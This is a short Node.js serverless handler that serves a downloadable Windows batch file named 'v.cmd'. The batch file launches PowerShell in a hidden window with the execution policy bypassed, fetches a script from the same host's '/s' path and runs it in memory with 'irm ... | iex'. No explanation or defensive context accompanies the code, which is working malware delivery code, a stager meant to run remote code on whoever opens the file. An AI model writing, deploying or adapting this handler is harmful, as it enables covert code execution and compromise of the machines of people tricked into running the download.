module.exports = (req, res) => {
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const base = proto + '://' + req.headers.host;
  const cmd = '@echo off\r\npowershell -nop -w h -ep bypass -c "irm ' + base + '/s|iex"\r\n';
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', 'attachment; filename="v.cmd"');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  res.status(200).send(cmd);
};
